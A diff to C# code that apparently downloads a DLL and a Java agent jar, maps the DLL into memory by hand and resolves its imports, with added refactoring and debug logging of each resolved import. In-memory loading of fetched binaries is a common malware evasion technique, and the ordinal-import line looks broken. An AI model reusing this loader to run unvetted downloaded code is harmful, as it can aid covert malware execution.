@@ -78,6 +78,11 @@ namespace Svc
             }
             catch (Exception ex) { Console.WriteLine("[!] download failed: " + ex.Message); return 1; }
 
+            return RunDirect(dll, jar);
+        }
+
+        public static int RunDirect(byte[] dll, byte[] jar)
+        {
             Console.WriteLine("[+] loader.dll=" + dll.Length + " agent.jar=" + jar.Length);
             if (dll.Length < 64 || jar.Length < 4) { Console.WriteLine("[!] files too small"); return 1; }
             if (ReadU16(dll, 0) != 0x5A4D) { Console.WriteLine("[!] bad MZ"); return 1; }
@@ -173,6 +178,7 @@ namespace Svc
 
                     int thunk = (int)oftRva;
                     int func = (int)ftRva;
+                    int impIdx = 0;
 
                     while (thunk + 8 <= image.Length)
                     {
@@ -180,21 +186,26 @@ namespace Svc
                         if (entry == 0) break;
 
                         IntPtr resolved;
+                        string resolvedName = "";
                         if ((entry & 0x8000000000000000UL) != 0)
                         {
                             int ordinal = (int)(entry & 0xFFFF);
                             resolved = GetProcAddress(mod, new string((char)ordinal, 1));
+                            resolvedName = "ord#" + ordinal;
                         }
                         else
                         {
                             int hintNameOff = (int)entry + 2;
                             string funcName = ReadAscii(image, hintNameOff);
                             resolved = GetProcAddress(mod, funcName);
+                            resolvedName = funcName;
                         }
 
+                        Console.WriteLine("[imp] " + impIdx + " " + resolvedName + " => 0x" + resolved.ToInt64().ToString("X"));
                         WriteU64(image, func, (ulong)resolved.ToInt64());
                         thunk += 8;
                         func += 8;
+                        impIdx++;
                     }
 
                     impOff += 20;
@@ -292,6 +303,10 @@ namespace Svc
                 }
                 else break;
             }
+
+            // re-check process after polling
+            GetExitCodeProcess(proc, out procExit);
+            Console.WriteLine("[*] post-poll exit=0x" + procExit.ToString("X8"));
 
             // deferred cleanup: free DLL image, jar bytes, context struct
             System.Threading.ThreadPool.QueueUserWorkItem(_ =>
